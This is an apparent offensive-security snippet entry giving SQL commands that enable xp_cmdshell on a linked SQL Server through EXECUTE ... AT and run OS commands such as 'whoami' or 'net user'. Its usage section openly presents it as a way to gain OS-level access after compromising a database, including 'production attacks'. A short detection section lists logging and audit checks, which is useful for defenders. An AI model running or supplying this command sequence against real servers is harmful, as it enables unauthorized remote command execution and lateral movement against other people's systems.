---
id: 1cf3fc27-4cc3-47ea-85ad-ba50f2bb0743
name: SQL-Enable-xp_cmdshell-on-Linked-Server
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:20.127747+00:00'
updated_at: '2023-04-10T20:36:44.282960+00:00'
platforms:
  - Windows
tags:
  - mssql
  - xp_cmdshell
  - linked-server
validated: true
---

# SQL-Enable-xp_cmdshell-on-Linked-Server

## Code

```sql
SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
```

## Description

This SQL code snippet enables the xp_cmdshell extended stored procedure on a linked SQL Server database and executes a 'whoami' command to demonstrate remote OS command execution. It uses the EXECUTE ... AT syntax to run configuration changes and the procedure remotely, providing a way to achieve command shell access from a controlling database instance.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| linked.database.local | The linked server name or endpoint | target.sqlserver.local |
| whoami | The command to execute via xp_cmdshell (replace with other commands as needed) | dir c:\\ or net user |

## Usage

Execute this sequence in SQL Server Management Studio (SSMS) or sqlcmd from a database with a configured linked server connection. It requires sysadmin privileges. Use after initial database compromise to gain OS-level access on the remote host. For production attacks, parameterize the server name and command to avoid hardcoding. This can be adapted into a stored procedure for reuse.

## Detection

- Monitor SQL Server error logs for sp_configure changes to 'show advanced options' or 'xp_cmdshell'.
- Audit EXECUTE ... AT statements targeting linked servers in SQL traces or extended events.
- Watch for xp_cmdshell invocations in query logs and corresponding OS command activity in Windows Security Event Logs (Event ID 4688 for process creation).
- Use SQL Server Audit to flag configuration changes and extended procedure usage.

## Related

- [[procedures/Enable-and-Execute-xp_cmdshell-on-Linked-Database]]
